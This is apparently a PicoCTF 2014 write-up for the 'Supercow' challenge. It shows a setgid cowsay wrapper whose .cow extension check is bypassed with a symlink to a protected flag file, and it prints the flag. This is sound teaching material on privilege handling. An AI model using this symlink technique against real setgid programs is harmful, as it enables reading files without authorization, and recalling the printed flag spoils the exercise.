# Pico CTF 2014 : Supercow

**Category:** Forensics
**Points:** 40
**Description:**

>Daedalus Corp. has a special utility for printing .cow files at /home/daedalus/supercow. Can you figure out how to get it to print out the flag?

**Hint:**
>Read up on [symlinks](http://en.wikipedia.org/wiki/Symbolic_link) in Linux.

## Write-up

We login to the [Shell](https://picoctf.com/shell) and checkout the directory in question:

```
shell:/home/daedalus$ ls -la
total 36
drwxr-xr-x  2 root root     4096 Jul  6  2015 .
drwxr-xr-x 19 root root     4096 Jul  6  2015 ..
-r--r-----  1 root daedalus   26 Jul  6  2015 flag.txt
-r--r-----  1 root daedalus   15 Jul  6  2015 hint.cow
-r--r-----  1 root daedalus   11 Jul  6  2015 secret1.cow
-r--r-----  1 root daedalus   11 Jul  6  2015 secret2.cow
-rwxr-sr-x  1 root daedalus 7639 Jul  6  2015 supercow
-rw-r--r--  1 root root     1723 Jul  6  2015 supercow.c
```

Let's try supercow with the files in the dir:

```
@shell:/home/daedalus$ ./supercow secret1.cow
 ____________
< cow_text_1 >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow secret2.cow
 ____________
< cow_text_2 >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow hint.cow
 ________________
< perhaps_a_hint >
 ----------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
@shell:/home/daedalus$ ./supercow flag.txt
Filename must end in .cow
```

And let's also check out supercow.c

```
@shell:/home/daedalus$ cat supercow.c
/*
 * The below isn't critical to solving the problem, but read on if
 * you're interested!
 *
 * You might be wondering - why is it that the supercow program is able
 * to read the /home/problemuser/secret1.cow file, but trying to read it
 * with:
 *
 * cat /home/problemuser/secret1.cow
 *
 * gives a permission denied error?
 *
 * supercow is a setgid program. This means that when you run supercow,
 * it runs with the privileges of problemuser instead of your user. That
 * is why the supercow program can access /home/problemuser/secret1.cow
 * (and potentially /home/problemuser/flag), even though it is not
 * readable by your normal user.
 *
 * $ ls -l supercow
 * -rwsr-xr-x 1 problemuser root [size in bytes] [last modified time] supercow
 *    ^ this s signifies that supercow is setgid. This means that
 *      supercow runs with the privileges of its owner user, which is
 *      problemuser.
 *
 * For more information about how this works, see
 * http://en.wikipedia.org/wiki/Setuid, or feel free to ask an organizer
 * :-)
 */
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv) {
  if (argc < 2) {
    printf("Usage: super_cow [cow_file]\n");
    return 1;
  }

  char *file = argv[1];
  char *ext = strrchr(file, '.');
  if (ext == NULL || strcmp(ext, ".cow") != 0) {
    printf("Filename must end in .cow\n");
    return 1;
  }

  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open");
    return 1;
  }

  dup2(fd, 0);

  gid_t gid = getegid();
  setregid(gid, gid);

  char *arg[] = { "/usr/games/cowsay", NULL };
  char *env[] = { NULL };
  execve(arg[0], arg, env);
  return 1;
}
```

We observe that the C code checks if the file's extension is .cow and only then passes it on as an argument to our setgid cowsay. Since the supercow binary has the setgid bit on it is executed as its group user instead of our own user. So if we manage to pass the flag.txt to the binary and pass the check for the extension we should be able to read the flag with the permissions from group daedalus.
The hint suggests using symlinks since we don't have any other (simple) way to read/copy the file or alter it's permissions or owner/group.

We can do:

```
ln -siv /home/daedalus/flag.txt ~/flag.cow
```

The supercow binary will then pass the extension check since our symlink ends in .cow and it will read the actual flag since the open() call will follow the symlink.

```
@shell:/home/daedalus$ ./supercow ~/flag.cow
 ___________________________
< cows_drive_mooooving_vans >
 ---------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

**cows_drive_mooooving_vans** is our flag.

## Other write-ups and resources

* none yet
